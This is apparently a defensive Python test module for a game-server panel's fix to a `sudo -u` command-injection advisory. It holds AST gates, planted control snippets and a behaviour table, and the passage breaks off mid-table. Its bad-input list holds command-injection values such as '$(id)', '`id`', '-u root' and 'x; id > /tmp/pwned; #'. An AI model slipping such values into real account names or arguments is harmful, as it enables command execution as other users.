"""Part 7 of the unit suite. Imported for its side effects.

GHSA-hh39-76g3-wxcx: a game server's account (short_name) and LinuxGSM script name (lgsm_name)
went into `sudo -u <account> bash -c '<body>'` unquoted and unchecked from twenty-five builders,
while the model's @validates hook checks them only on ASSIGNMENT — never on a row loaded from the
database, a restored backup, or a hand edit. Every such command is now built by one choke point
(_core.game_user_cmd / game_user_exec_cmd), which refuses an unsafe name. This part holds that:

  1. GATES over panel/**/*.py (AST, so comments and docstrings are not code): no `sudo -u` built
     with an unquoted interpolation; no `sudo -u` built anywhere BUT the two builders, which must
     validate first; and every helper call whose body names the LinuxGSM script passes it along
     (or the function checks it). Each gate has a CONTROL that proves it can fail.
  2. BEHAVIOUR, per converted function: every unsafe name is refused, nothing reaches the
     transport, and the refusal reads as the function's own "could not run" — never as an empty,
     healthy answer. A plain name still sends its command, spelled exactly as the old builders
     spelled it.
  3. DATA LAYER: a backup whose database carries such a row is refused before anything is
     touched, and a clean one still restores; a row LOADED with one is flagged, not fatal.
"""
import ast as _gh_ast
import io as _gh_io
import logging as _gh_logging
import shlex as _gh_shlex
import shutil as _gh_shutil
import sqlite3 as _gh_sqlite
import tarfile as _gh_tar
import tempfile as _gh_tmp

from unit.part01 import (NS, _sm_core, _sm_cron, _sm_files, _sm_game, _sm_gmod, check, os, re)  # noqa: F401,E402
from unit import REPO_ROOT as _gh_root  # noqa: E402

from panel.security import privileged as _gh_priv  # noqa: E402

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 1. GATES
# ═══════════════════════════════════════════════════════════════════════════════════════════════
# Text that ends in `sudo [-flags] -u ` (or --user=): whatever is interpolated next is the account.
_GH_TAIL = re.compile(r"\bsudo(?:\s+-{1,2}[A-Za-z][\w-]*)*\s+(?:-u\s*|--user[=\s]\s*)\Z")
_GH_FORMAT_TAIL = re.compile(r"\bsudo(?:\s+-{1,2}[A-Za-z][\w-]*)*\s+(?:-u\s*|--user[=\s]\s*)\{")
_GH_PCT = re.compile(r"%(?:\(([^)]*)\))?[#0\- +]*(?:\*|\d+)?(?:\.(?:\*|\d+))?([diouxXeEfFgGcrsa%])")
_GH_QUOTERS = {"_quote", "quote"}
_GH_BUILDERS = {"game_user_cmd", "game_user_exec_cmd"}
_GH_BUILDER_FILE = os.path.join("panel", "ops", "ssh_manager", "_core.py")
_GH_VALIDATORS = {"_require_game_idents", "game_idents_ok", "_idents_ok"}
_GH_HELPER_CALLS = {"game_user_cmd", "game_user_exec_cmd", "shell_as_game_user"}
_GH_SELF_NAMES = {"selfname", "lgsm_name"}
# ...and where a script name comes from WITHOUT one of those names: a GameServer's own attributes.
# console_log is `/home/<account>/log/console/<lgsm_name>-console.log`, lgsm_name is
# `<game_type>server`, and all of it is loaded from the database. The first version of this gate
# keyed on the two local NAMES only, so `log_path = gs.console_log` handed to read_as_game_user
# with no selfname= was invisible to it — the console poller ran game_type unchecked (review F1).
_GH_SELF_ATTRS = {"lgsm_name", "game_type", "console_log", "server_script"}
# Every helper that runs panel-built TEXT as a game account, and so must be told the script name
# when the text carries one. read_as_game_user was missing from the first version.
_GH_TEXT_RUNNERS = {"shell_as_game_user", "read_as_game_user", "game_user_cmd", "game_user_exec_cmd"}


def _gh_callee(call):
    f = call.func
    return f.attr if isinstance(f, _gh_ast.Attribute) else (f.id if isinstance(f, _gh_ast.Name) else "")


def _gh_quoted(v):
    return isinstance(v, _gh_ast.Call) and _gh_callee(v) in _GH_QUOTERS


def _gh_trailing_text(node):
    """The literal text a string expression ENDS with, or None when it ends in a value."""
    if isinstance(node, _gh_ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, _gh_ast.JoinedStr) and node.values:
        last = node.values[-1]
        return last.value if isinstance(last, _gh_ast.Constant) else None
    if isinstance(node, _gh_ast.BinOp) and isinstance(node.op, _gh_ast.Add):
        return _gh_trailing_text(node.right)
    return None


def _gh_sites(tree):
    """Every place a COMMAND STRING is built with a value interpolated straight after `sudo -u`:
    [(line, value node or None, kind)]. Plus list-form argvs: kind 'argv'."""
    out = []
    for n in _gh_ast.walk(tree):
        if isinstance(n, _gh_ast.JoinedStr):
            prev = ""
            for v in n.values:
                if isinstance(v, _gh_ast.Constant) and isinstance(v.value, str):
                    prev = v.value
                elif isinstance(v, _gh_ast.FormattedValue):
                    if _GH_TAIL.search(prev):
                        out.append((n.lineno, v.value, "fstring"))
                    prev = ""
        elif (isinstance(n, _gh_ast.BinOp) and isinstance(n.op, _gh_ast.Mod)
              and isinstance(n.left, _gh_ast.Constant) and isinstance(n.left.value, str)):
            fmt = n.left.value
            args = n.right.elts if isinstance(n.right, _gh_ast.Tuple) else [n.right]
            i = 0
            for m in _GH_PCT.finditer(fmt):
                if m.group(2) == "%":
                    continue
                val = None
                if m.group(1) is not None and isinstance(n.right, _gh_ast.Dict):
                    for k, dv in zip(n.right.keys, n.right.values):
                        if isinstance(k, _gh_ast.Constant) and k.value == m.group(1):
                            val = dv
                elif m.group(1) is None:
                    val = args[i] if i < len(args) else None
                    i += 1
                if _GH_TAIL.search(fmt[:m.start()]):
                    out.append((n.lineno, val, "percent"))
        elif isinstance(n, _gh_ast.BinOp) and isinstance(n.op, _gh_ast.Add):
            t = _gh_trailing_text(n.left)
            if t is not None and _GH_TAIL.search(t):
                r = n.right
                if isinstance(r, _gh_ast.JoinedStr) and r.values and isinstance(r.values[0], _gh_ast.FormattedValue):
                    out.append((n.lineno, r.values[0].value, "concat"))
                elif not (isinstance(r, (_gh_ast.Constant, _gh_ast.JoinedStr))):
                    out.append((n.lineno, r, "concat"))
        elif (isinstance(n, _gh_ast.Call) and isinstance(n.func, _gh_ast.Attribute)
              and n.func.attr == "format" and isinstance(n.func.value, _gh_ast.Constant)
              and isinstance(n.func.value.value, str) and _GH_FORMAT_TAIL.search(n.func.value.value)):
            out.append((n.lineno, None, "format"))
        elif isinstance(n, (_gh_ast.List, _gh_ast.Tuple)):
            elts, seen_sudo = n.elts, False
            for j, e in enumerate(elts):
                if isinstance(e, _gh_ast.Constant) and e.value == "sudo":
                    seen_sudo = True
                elif (seen_sudo and isinstance(e, _gh_ast.Constant) and e.value in ("-u", "--user")
                      and j + 1 < len(elts) and not isinstance(elts[j + 1], _gh_ast.Constant)):
                    out.append((n.lineno, elts[j + 1], "argv"))
    return out


def _gh_functions(tree):
    return [n for n in _gh_ast.walk(tree) if isinstance(n, (_gh_ast.FunctionDef, _gh_ast.AsyncFunctionDef))]


def _gh_enclosing(funcs, line):
    best = None
    for f in funcs:
        if f.lineno <= line <= f.end_lineno and (best is None or f.lineno > best.lineno):
            best = f
    return best


def _gh_names_script(node, tainted):
    """Does expression `node` carry a script name: a tainted local, or a GameServer attribute?"""
    return any((isinstance(x, _gh_ast.Name) and x.id in tainted)
               or (isinstance(x, _gh_ast.Attribute) and x.attr in _GH_SELF_ATTRS)
               for x in _gh_ast.walk(node))


# Calls whose RESULT is still the text they were handed. Any other call makes a new value:
# `vals = lgsm_get_values(server, user, selfname, …)` is config values, not the script name.
_GH_TEXT_CALLS = {"str", "strip", "lstrip", "rstrip", "lower", "upper", "replace", "format", "join",
                  "_quote", "quote"}


def _gh_carries(node, tainted):
    """Does the VALUE of expression `node` carry the script name as text?"""
    if isinstance(node, _gh_ast.Name):
        return node.id in tainted
    if isinstance(node, _gh_ast.Attribute):
        return node.attr in _GH_SELF_ATTRS or _gh_carries(node.value, tainted)
    if isinstance(node, _gh_ast.Call):
        if _gh_carries(node.func, tainted):            # a method of a value that carries it
            return True
        return _gh_callee(node) in _GH_TEXT_CALLS and any(
            _gh_carries(a, tainted) for a in list(node.args) + [k.value for k in node.keywords])
    return any(_gh_carries(c, tainted) for c in _gh_ast.iter_child_nodes(node))


def _gh_tainted(func):
    """The local names in `func` that carry the script name: selfname / lgsm_name, and every name
    assigned from an expression whose value does (`log_path = gs.console_log`), to a fixed point."""
    tainted, grew = set(_GH_SELF_NAMES), True
    while grew:
        grew = False
        for n in _gh_ast.walk(func):
            if isinstance(n, _gh_ast.Assign):
                targets, value = n.targets, n.value
            elif isinstance(n, (_gh_ast.AnnAssign, _gh_ast.AugAssign, _gh_ast.NamedExpr)):
                targets, value = [n.target], n.value
            else:
                continue
            if value is None or not _gh_carries(value, tainted):
                continue
            for t in targets:
                for x in _gh_ast.walk(t):
                    if isinstance(x, _gh_ast.Name) and x.id not in tainted:
                        tainted.add(x.id)
                        grew = True
    return tainted


def _gh_validates_before(func, line, names=None):
    """True when `func` calls a validator at or before `line` — with one of `names` (or a
    GameServer script attribute) among its arguments, when given."""
    for n in _gh_ast.walk(func):
        if isinstance(n, _gh_ast.Call) and _gh_callee(n) in _GH_VALIDATORS and n.lineno <= line:
            if names is None:
                return True
            if any(_gh_names_script(a, names) for a in n.args):
                return True
    return False


def _gh_interpolates_self(func, tainted=None):
    """Does `func` put the LinuxGSM script name into TEXT — an f-string, a % format, a +, a
    .format(), or the tmux socket snippet?"""
    tainted = _gh_tainted(func) if tainted is None else tainted
    for n in _gh_ast.walk(func):
        holders = []
        if isinstance(n, _gh_ast.FormattedValue):
            holders.append(n.value)
        elif isinstance(n, _gh_ast.BinOp) and isinstance(n.op, (_gh_ast.Mod, _gh_ast.Add)):
            holders += [n.left, n.right]
        elif isinstance(n, _gh_ast.Call) and _gh_callee(n) == "_tmux_live_socket_sh":
            holders += list(n.args)
        elif (isinstance(n, _gh_ast.Call) and isinstance(n.func, _gh_ast.Attribute)
              and n.func.attr == "format" and isinstance(n.func.value, _gh_ast.Constant)):
            holders += list(n.args) + [k.value for k in n.keywords]
        for h in holders:
            if _gh_names_script(h, tainted):
                return True
    return False


def _gh_scan(src, rel):
    """(problems, sites, helper_calls) for one module's source. `rel` is its repo-relative path."""
    tree = _gh_ast.parse(src)
    funcs = _gh_functions(tree)
    problems, sites = [], _gh_sites(tree)
    for line, val, kind in sites:
        fn = _gh_enclosing(funcs, line)
        where = "%s:%d %s()" % (rel, line, fn.name if fn else "<module>")
        if kind == "argv":
            # An argv has no shell to escape — but sudo still RESOLVES the name ("#0" is uid 0).
            if fn is None or not _gh_validates_before(fn, line):
                problems.append("G2 %s: a `sudo -u` argv with no account check before it" % where)
            continue
        if kind == "format" or not _gh_quoted(val):
            problems.append("G1 %s: `sudo -u` built with an unquoted %s interpolation" % (where, kind))
        if not (fn is not None and fn.name in _GH_BUILDERS and rel == _GH_BUILDER_FILE):
            problems.append("G2 %s: `sudo -u` built outside _core.game_user_cmd/game_user_exec_cmd"
                            % where)
        elif not any(isinstance(n, _gh_ast.Call) and _gh_callee(n) == "_require_game_idents"
                     and n.lineno <= line for n in _gh_ast.walk(fn)):
            problems.append("G2 %s: the builder does not check the account before building" % where)
    helper_calls = 0
    for n in _gh_ast.walk(tree):
        if not (isinstance(n, _gh_ast.Call) and _gh_callee(n) in (_GH_TEXT_RUNNERS | {"_rewrite_crontab"})):
            continue
        fn = _gh_enclosing(funcs, n.lineno)
        if fn is None or fn.name in _GH_BUILDERS or fn.name == "shell_as_game_user":
            continue
        if _gh_callee(n) in _GH_HELPER_CALLS:
            helper_calls += 1
        tainted = _gh_tainted(fn)
        if not _gh_interpolates_self(fn, tainted):
            continue
        passes_self = _gh_callee(n) in _GH_TEXT_RUNNERS and any(k.arg == "selfname" for k in n.keywords)
        if not (passes_self or _gh_validates_before(fn, n.lineno, tainted)):
            problems.append("G3 %s:%d %s(): its body names the LinuxGSM script, and %s() is neither "
                            "given selfname= nor preceded by a check of it"
                            % (rel, n.lineno, fn.name, _gh_callee(n)))
    return problems, sites, helper_calls


_gh_problems, _gh_all_sites, _gh_helper_calls, _gh_files = [], [], 0, 0
for _gh_dp, _gh_dns, _gh_fns in os.walk(os.path.join(_gh_root, "panel")):
    _gh_dns[:] = [d for d in _gh_dns if d != "__pycache__"]
    for _gh_fn in sorted(_gh_fns):
        if not _gh_fn.endswith(".py"):
            continue
        _gh_path = os.path.join(_gh_dp, _gh_fn)
        _gh_rel = os.path.relpath(_gh_path, _gh_root)
        with open(_gh_path, encoding="utf-8") as _gh_f:
            _gh_p, _gh_s, _gh_h = _gh_scan(_gh_f.read(), _gh_rel)
        _gh_files += 1
        _gh_problems += _gh_p
        _gh_all_sites += [(_gh_rel,) + s for s in _gh_s]
        _gh_helper_calls += _gh_h

check("GHSA-hh39 gate: the scan read the panel's modules (not an empty walk)",
      _gh_files >= 50, "%d files" % _gh_files)
check("GHSA-hh39 gate G1/G2/G3: every `sudo -u` is built by the checked builder, quoted, with the "
      "script name passed along",
      not _gh_problems, "; ".join(_gh_problems[:6]))
# The anchor, matched ONCE each: the gate above passes vacuously if the scanner cannot see the
# builders, so the scanner must find exactly the three sites that are allowed to exist.
_gh_where = sorted((r, ln, k) for r, ln, _v, k in _gh_all_sites)
check("GHSA-hh39 gate: the scanner finds exactly the two string builders and the one argv site",
      [(r, k) for r, _ln, k in _gh_where] == [
          (_GH_BUILDER_FILE, "fstring"),
          (_GH_BUILDER_FILE, "fstring"),
          (os.path.join("panel", "ops", "ssh_manager", "cron.py"), "argv")],
      repr(_gh_where))
check("GHSA-hh39 gate: ...and the command sites it checks for selfname actually exist",
      _gh_helper_calls >= 40, "%d helper calls" % _gh_helper_calls)

# ── CONTROLS: each gate, fed a planted bad snippet, must fail — and a good one must not ────────
_GH_BUILDER_REL = _GH_BUILDER_FILE


def _gh_plant(src, rel="panel/planted.py"):
    return _gh_scan(src, rel)[0]


_gh_ctl = {
    "G1 f-string": _gh_plant('def f(user):\n    return f"sudo -u {user} bash -c x"\n'),
    "G1 percent": _gh_plant('def f(user, x):\n    return "sudo -u %s bash -c %s" % (user, _quote(x))\n'),
    "G1 concat": _gh_plant('def f(user):\n    return "sudo -n -u " + user\n'),
    "G1 .format": _gh_plant('def f(user):\n    return "sudo -u {} bash".format(user)\n'),
    "G2 quoted but outside the builder": _gh_plant(
        'def f(user):\n    return f"sudo -u {_quote(user)} bash -c x"\n'),
    "G2 the builder without its check": _gh_plant(
        'def game_user_cmd(user, inner, selfname=None):\n'
        '    return f"sudo -u {_quote(user)} bash -c {_quote(inner)}"\n', _GH_BUILDER_REL),
    "G2 an argv with no check": _gh_plant('def f(user):\n    return ["sudo", "-u", user, "cat"]\n'),
    "G3 script name dropped": _gh_plant(
        'def f(server, user, selfname):\n'
        '    return _core.shell_as_game_user(server, user, f"./{selfname} details")\n'),
    "G3 crontab line names an unchecked script": _gh_plant(
        'def f(server, user, selfname):\n'
        '    return _rewrite_crontab(server, user, "", [f"* * * * * /home/{user}/{selfname}"])\n'),
    # The review's F1, as it was written in server_files._console_tick: no local is NAMED selfname
    # or lgsm_name, the script name arrives through a GameServer attribute and a local.
    "G3 console path from a GameServer attribute, via a local, to read_as_game_user": _gh_plant(
        'def f(gs):\n'
        '    log_path = gs.console_log\n'
        '    return _sm.read_as_game_user(gs.remote, gs.short_name, f"tail -5 {log_path}")\n'),
    "G3 game_type straight into the text": _gh_plant(
        'def f(gs):\n'
        '    return _core.shell_as_game_user(gs.remote, gs.short_name, "./%sserver x" % gs.game_type)\n'),
    "G3 through a string method and .format()": _gh_plant(
        'def f(server, user, gs):\n'
        '    name = (gs.lgsm_name or "").strip()\n'
        '    return _core.shell_as_game_user(server, user, "./{} details".format(name))\n'),
}
check("GHSA-hh39 gate CONTROL: every planted bad shape is caught, by the gate it belongs to",
      all(any(p.startswith(k.split()[0] + " ") for p in v) for k, v in _gh_ctl.items()),
      {k: v for k, v in _gh_ctl.items() if not any(p.startswith(k.split()[0] + " ") for p in v)})
_gh_good = {
    "the builder, checked": _gh_plant(
        'def game_user_cmd(user, inner, selfname=None):\n'
        '    _require_game_idents(user, selfname)\n'
        '    return f"sudo -u {_quote(user)} bash -c {_quote(inner)}"\n', _GH_BUILDER_REL),
    "an argv, checked": _gh_plant(
        'def f(user):\n    _core._require_game_idents(user)\n    return ["sudo", "-u", user]\n'),
    "script name passed": _gh_plant(
        'def f(server, user, selfname):\n'
        '    return _core.shell_as_game_user(server, user, f"./{selfname} x", selfname=selfname)\n'),
    "script name checked first": _gh_plant(
        'def f(server, user, selfname):\n'
        '    if not _core.game_idents_ok(user, selfname):\n        return None\n'
        '    return _rewrite_crontab(server, user, "", [f"/home/{user}/{selfname}"])\n'),
    "a comment or docstring mentioning it": _gh_plant(
        'def f(user):\n    """`sudo -u {user} bash -c` used to be spelled here."""\n'
        '    # f"sudo -u {user}"\n    return 1\n'),
    "the console path WITH the script name passed": _gh_plant(
        'def f(gs):\n'
        '    log_path = gs.console_log\n'
        '    return _sm.read_as_game_user(gs.remote, gs.short_name, f"tail -5 {log_path}",\n'
        '                                 selfname=gs.lgsm_name)\n'),
    "a game_type attribute checked first": _gh_plant(
        'def f(gs):\n'
        '    if not _core.game_idents_ok(gs.short_name, gs.lgsm_name):\n        return None\n'
        '    return _core.shell_as_game_user(gs.remote, gs.short_name, f"./{gs.lgsm_name} x")\n'),
    # A call's RESULT is not the name it was handed: this is player_count_via_lgsm_query's shape,
    # and a taint that flowed through every call argument called it a script name.
    "config values READ with the script name are not the script name": _gh_plant(
        'def f(server, user, selfname):\n'
        '    vals = files.lgsm_get_values(server, user, selfname, ["port"])\n'
        '    q = vals.get("port").strip()\n'
        '    return _core.shell_as_game_user(server, user, "gamedig %s" % q)\n'),
}
check("GHSA-hh39 gate CONTROL: ...and the correct shapes pass (the gate is not a blanket no)",
      not any(_gh_good.values()), {k: v for k, v in _gh_good.items() if v})

# ── G4: every system-ssh argv takes its destination from ssh_destination, after `--` ─────────
# Review F4: four argvs handed `<username>@<host>` from a LOADED row to ssh, which reads a leading
# dash as an option. Every list literal that begins with "ssh" must put SSH_DEST_SEP immediately
# before an ssh_destination(...) call — so a fifth ssh argv cannot be added the old way.
def _gh_ssh_argv_problems(src, rel):
    out, tree = [], _gh_ast.parse(src)
    parent = {c: p for p in _gh_ast.walk(tree) for c in _gh_ast.iter_child_nodes(p)}
    for n in _gh_ast.walk(tree):
        if not (isinstance(n, _gh_ast.List) and n.elts and isinstance(n.elts[0], _gh_ast.Constant)
                and n.elts[0].value == "ssh"):
            continue
        # The WHOLE argv: `["ssh", …] + _ssh_mux_opts() + ["-p", …, dest]` is one command line.
        top = n
        while isinstance(parent.get(top), _gh_ast.BinOp) and isinstance(parent[top].op, _gh_ast.Add):
            top = parent[top]
        elts = [e for part in _gh_ast.walk(top) if isinstance(part, _gh_ast.List) for e in part.elts]
        if not any(isinstance(e, _gh_ast.Constant) and isinstance(e.value, str) and e.value.startswith("-")
                   for e in elts):
            continue    # ["ssh"] naming the service, ["ssh", n] naming its journal: not a command line
        ok = False
        for a, b in zip(elts, elts[1:]):
            sep = (isinstance(a, (_gh_ast.Name, _gh_ast.Attribute))
                   and (getattr(a, "id", None) or getattr(a, "attr", None)) == "SSH_DEST_SEP")
            if sep and isinstance(b, _gh_ast.Call) and _gh_callee(b) == "ssh_destination":
                ok = True
        if not ok:
            out.append("G4 %s:%d: an ssh argv whose destination is not SSH_DEST_SEP, "
                       "ssh_destination(...)" % (rel, n.lineno))
    return out


_gh_ssh_found, _gh_ssh_bad = 0, []
for _gh_dp, _gh_dns, _gh_fns in os.walk(os.path.join(_gh_root, "panel")):
    _gh_dns[:] = [d for d in _gh_dns if d != "__pycache__"]
    for _gh_fn in sorted(_gh_fns):
        if _gh_fn.endswith(".py"):
            _gh_path = os.path.join(_gh_dp, _gh_fn)
            with open(_gh_path, encoding="utf-8") as _gh_f:
                _gh_src = _gh_f.read()
            _gh_ssh_bad += _gh_ssh_argv_problems(_gh_src, os.path.relpath(_gh_path, _gh_root))
            # Counted by the SAME definition, with the destination rule made unsatisfiable.
            _gh_ssh_found += len(_gh_ssh_argv_problems(_gh_src.replace("ssh_destination(", "ssh_dest_off("),
                                                       "x"))
check("GHSA-hh39 gate G4: every system-ssh argv takes its destination from ssh_destination, after `--`",
      not _gh_ssh_bad, "; ".join(_gh_ssh_bad[:4]))
check("GHSA-hh39 gate G4: ...and it found the four ssh argvs there are (the Tailscale transport, two "
      "downloads, the terminal)", _gh_ssh_found == 4, "%d found" % _gh_ssh_found)
check("GHSA-hh39 gate G4 CONTROL: the old spelling fails it, and the new one passes",
      _gh_ssh_argv_problems('a = ["ssh", "-p", "22", f"{s.username}@{h}", cmd]\n', "x.py")
      and _gh_ssh_argv_problems('a = ["ssh", "-p", "22", _core.ssh_destination(u, h), cmd]\n', "x.py")
      and not _gh_ssh_argv_problems('a = ["ssh", "-p", "22", _core.SSH_DEST_SEP, '
                                    '_core.ssh_destination(u, h), cmd]\n', "x.py"))

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 2. BEHAVIOUR — every converted function, through a transport that records instead of sending
# ═══════════════════════════════════════════════════════════════════════════════════════════════
_gh_sent = []
_GH_CRONTAB = "*/5 * * * * /home/gm2/gmodserver monitor > /dev/null 2>&1\n"


def _gh_reply(cmd):
    if "common.cfg" in cmd:        # lgsm_get_values' framed read: a config that lets callers go on
        return ('querymode="2"\nquerytype="protocol-valve"\nqueryport="27015"\n'
                'servercfg="gmodserver.cfg"\n' + _sm_files._READ_END, "", 0)
    if cmd.startswith("id -gn"):
        return ("gmodcontent", "", 0)
    return ("", "", 0)


def _gh_run(server, cmd, timeout=30, sudo=None, stdin_text=None):
    _gh_sent.append(("run", cmd))
    return _gh_reply(cmd)


def _gh_privileged(server, verb, args=(), timeout=30, merge_stderr=True, sudo=True):
    # The REAL argument table, as on the wire: a verb it refuses raises and sends nothing.
    _gh_priv.check_args(verb, args)
    _gh_sent.append(("priv", verb, list(args)))
    if verb == "crontab-list":
        return (_GH_CRONTAB, "", 0)
    if verb == "content-game-present":
        return ("", "", 1)
    return ("", "", 0)


class _GhPopen:
    def __init__(self, argv, **k):
        _gh_sent.append(("popen", list(argv)))
        self.stdout = _gh_io.BytesIO(b"")
        self.stdin = _gh_io.BytesIO()

    def wait(self):
        return 0


class _GhChan(_gh_io.BytesIO):
    def write(self, *a):
        return 0

    def close(self):
        pass


class _GhClient:
    def exec_command(self, cmd):
        _gh_sent.append(("exec", cmd))
        return _GhChan(), _gh_io.BytesIO(b""), _gh_io.BytesIO(b"")


import panel.routes._shared as _gh_shared  # noqa: E402
from panel.core import panel_state as _gh_ps  # noqa: E402

_GH_SAVED = [(_sm_core, n, getattr(_sm_core, n)) for n in (
    "run_command", "run_privileged", "_exec_local_argv", "helper_present",
    "get_connection", "_resolve_ts_host")]
_GH_SAVED += [(_sm_cron.subprocess, "Popen", _sm_cron.subprocess.Popen),
              (_sm_files.subprocess, "Popen", _sm_files.subprocess.Popen),
              (_sm_game.time, "sleep", _sm_game.time.sleep)]
_GH_SRV = NS(id=9101, is_local=False, auth_method="key", host="h", port=22, username="admin",
             sudo_enabled=True, name="h")
_GH_TS = NS(id=9102, is_local=False, auth_method="tailscale", host="h", port=22, username="admin",
            sudo_enabled=True, name="h")
_GH_LOCAL = NS(id=9103, is_local=True, auth_method="local", host="127.0.0.1", port=22,
               username="admin", sudo_enabled=True, name="h")
_GH_APP = NS(logger=NS(debug=lambda *a, **k: None))
# The advisory's own payload, and every other shape a name can break out, mislead sudo, or run long.
_GH_BAD = ["x; id > /tmp/pwned; #", "`id`", "$(id)", "a b", "-u root", "../x", "", "root", "#0",
           "gm2\n", None, "a" * 65, "x'y"]


def _gh_drain(u):
    _gh_ps._action_output[9104] = {"path": _gh_shared._action_log_path(u, "update"), "user": u, "pos": 0}
    try:
        return _gh_shared._drain_action_output(_GH_APP, _GH_SRV, 9104)
    finally:
        _gh_ps._action_output.pop(9104, None)


def _is_tuple_refusal(r):
    return isinstance(r, tuple) and len(r) == 3 and r[0] == "" and r[2] == 1


def _is_false_pair(r):
    return isinstance(r, tuple) and len(r) == 2 and r[0] is False


# (label, call(user, selfname), "the refusal reads as a refusal", script name in the body?, anchor)
_GH_TABLE = [
    ("_core.shell_as_game_user", lambda u, s: _sm_core.shell_as_game_user(_GH_SRV, u, "./%s x" % "gmodserver", selfname=s),
     _is_tuple_refusal, True, "./gmodserver x"),
    ("_core.read_as_game_user", lambda u, s: _sm_core.read_as_game_user(_GH_SRV, u, "tail -5 /tmp/f"),
     _is_tuple_refusal, False, "tail -5"),
    # ...and with a body that names the script, as the console reads' does (review F1).
    ("_core.read_as_game_user (selfname=)",
     lambda u, s: _sm_core.read_as_game_user(
         _GH_SRV, u, "tail -5 /home/%s/log/console/%s-console.log" % (u, s), selfname=s),
     _is_tuple_refusal, True, "-console.log"),
    ("_core.run_as_game_user", lambda u, s: _sm_core.run_as_game_user(_GH_SRV, u, "details", selfname=s),
     _is_tuple_refusal, True, "details"),
    ("_core.send_console_command", lambda u, s: _sm_core.send_console_command(_GH_SRV, u, "status", selfname=s),
     _is_tuple_refusal, True, "send-keys"),
    ("_core._rewrite_crontab", lambda u, s: _sm_core._rewrite_crontab(_GH_SRV, u, "-vF x", ["* * * * * true"]),
     _is_false_pair, False, "crontab"),
    ("_core.set_autostart", lambda u, s: _sm_core.set_autostart(_GH_SRV, u, True, s),
     _is_false_pair, True, "monitor"),
    ("_core.install_game_cron", lambda u, s: _sm_core.install_game_cron(_GH_SRV, u, s, {"monitor"}),
     _is_false_pair, True, "monitor"),
    ("_core.set_daily_restart", lambda u, s: _sm_core.set_daily_restart(_GH_SRV, u, s, "gmod", 27015),
     _is_false_pair, True, "restart-pending"),
    ("game.capture_console", lambda u, s: _sm_game.capture_console(_GH_SRV, u, s),
     _is_tuple_refusal, True, "capture-pane"),
    ("game._gamedig_player_list", lambda u, s: _sm_game._gamedig_player_list(_GH_SRV, u, "gmod", 27015),
     lambda r: r is None, False, "gamedig"),
    ("game.ensure_persistent_bans", lambda u, s: _sm_game.ensure_persistent_bans(_GH_SRV, u, s),
     lambda r: r is False, True, "banned_user"),
    ("game.run_game_backup", lambda u, s: _sm_game.run_game_backup(_GH_SRV, u, s, force=True),
     lambda r: r == (False, "invalid account or script name", False), True, "gmodserver backup"),
    ("game.list_server_commands", lambda u, s: _sm_game.list_server_commands(_GH_SRV, u, s),
     lambda r: r == [], True, "./gmodserver"),
    ("game._steam_build", lambda u, s: _sm_game._steam_build(_GH_SRV, u, s),
     lambda r: r == {}, True, "appmanifest"),
    ("game._queried_version", lambda u, s: _sm_game._queried_version(_GH_SRV, u, "gmod", 27015),
     lambda r: r == "", False, "gamedig"),
    ("cron._install_cron_runner", lambda u, s: _sm_cron._install_cron_runner(_GH_SRV, u),
     lambda r: r == 1, False, ".lgsm-cron"),
    ("cron._read_cron_status", lambda u, s: _sm_cron._read_cron_status(_GH_SRV, u),
     lambda r: r == {}, False, ".lgsm-cron"),
    ("cron.run_cron_job_now", lambda u, s: _sm_cron.run_cron_job_now(_GH_SRV, u, "* * * * * echo hi"),
     _is_false_pair, False, "setsid"),
    ("cron.list_game_backups", lambda u, s: _sm_cron.list_game_backups(_GH_SRV, u),
     lambda r: r is None, False, "lgsm/backup"),
    ("cron.prune_game_backups", lambda u, s: _sm_cron.prune_game_backups(_GH_SRV, u, 3),
     lambda r: r is False, False, "xargs -0"),
    ("cron.delete_game_backup", lambda u, s: _sm_cron.delete_game_backup(_GH_SRV, u, "gmodserver-2026.tar.gz"),
     lambda r: r is False, False, "rm -f --"),
    ("cron.stream_game_backup (paramiko)", lambda u, s: list(_sm_cron.stream_game_backup(_GH_SRV, u, "gmodserver-2026.tar.gz")),
     lambda r: r == [], False, "cat"),
    ("cron.stream_game_backup (tailscale)", lambda u, s: list(_sm_cron.stream_game_backup(_GH_TS, u, "gmodserver-2026.tar.gz")),
     lambda r: r == [], False, "cat"),
    ("cron.stream_game_backup (local, pre-helper argv)", lambda u, s: list(_sm_cron.stream_game_backup(_GH_LOCAL, u, "gmodserver-2026.tar.gz")),
     lambda r: r == [], False, "cat"),
    ("cron.player_count", lambda u, s: _sm_cron.player_count(_GH_SRV, u, "gmod", 27015),
     lambda r: r is None, False, "gamedig"),
    ("cron.player_slots", lambda u, s: _sm_cron.player_slots(_GH_SRV, u, "gmod", 27015),
     lambda r: r == (None, None, None), False, "gamedig"),
    ("cron.game_map", lambda u, s: _sm_cron.game_map(_GH_SRV, u, "gmod", 27999),
     lambda r: r == "", False, "gamedig"),
    ("cron.player_count_via_lgsm_query", lambda u, s: _sm_cron.player_count_via_lgsm_query(_GH_SRV, u, s, 27015),
     lambda r: r is None, True, "common.cfg"),
    ("cron.upgrade_managed_cron_tracking", lambda u, s: _sm_cron.upgrade_managed_cron_tracking(_GH_SRV, u, s, "gmod", 27015),
     lambda r: r is False, True, "crontab"),
    ("gmod.install_gmod_content", lambda u, s: _sm_gmod.install_gmod_content(_GH_SRV, u, ["cstrike"]),
     lambda r: isinstance(r, tuple) and r[0] is False and r[1] == [], False, "auto-install"),
    ("gmod.gmod_mount_setup", lambda u, s: _sm_gmod.gmod_mount_setup(_GH_SRV, u, "gmodcontent", ["cstrike"]),
     lambda r: r == (False, "invalid gmod user"), False, "mount.cfg"),
    ("gmod.gmod_mount_setup (the content account)",
     lambda u, s: _sm_gmod.gmod_mount_setup(_GH_SRV, "gm2", "gmodcontent" if u == "gm2" else u, ["cstrike"]),
     lambda r: r == (False, "invalid content user"), False, "mount.cfg"),
    # No `sudo -u` of its own (verbs only): held to "refused, nothing sent" and "a plain name runs".
    ("gmod.uninstall_gmod_content", lambda u, s: _sm_gmod.uninstall_gmod_content(_GH_SRV, u, ["cstrike"]),
     lambda r: isinstance(r, tuple) and r[0] is False and r[1] == [], False, None),
    # A mount check that could not run answers "restart needed" by design — see its docstring.
    ("gmod._mount_needs_restart", lambda u, s: _sm_gmod._mount_needs_restart(_GH_SRV, u),
     lambda r: r is True, False, "__LIVE__"),
    ("files.lgsm_read_config", lambda u, s: _sm_files.lgsm_read_config(_GH_SRV, u, s),
     lambda r: bool(r.get("error")), True, "config-lgsm"),
